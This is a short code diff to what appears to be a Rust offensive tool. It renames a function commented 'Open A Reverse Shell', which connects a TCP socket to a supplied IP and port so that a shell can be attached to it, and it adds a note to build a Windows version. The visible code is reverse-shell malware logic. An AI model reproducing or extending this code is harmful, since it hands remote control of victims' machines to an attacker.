@@ -8,7 +8,7 @@ use std::os::unix::io::{AsRawFd, FromRawFd};
 use std::process::{Command, Stdio};
 
 /* Open A Reverse Shell */
-pub fn unixshell(ip: String, port: String, shell: String) -> std::io::Result<()> {
+pub fn shell(ip: String, port: String, shell: String) -> std::io::Result<()> {
     let full: String = format!("{}:{}", ip, port);
 
     let sock = TcpStream::connect(full)?;
@@ -27,3 +27,5 @@ pub fn unixshell(ip: String, port: String, shell: String) -> std::io::Result<()>
 
     return Ok(());
 }
+
+//todo add windows shell
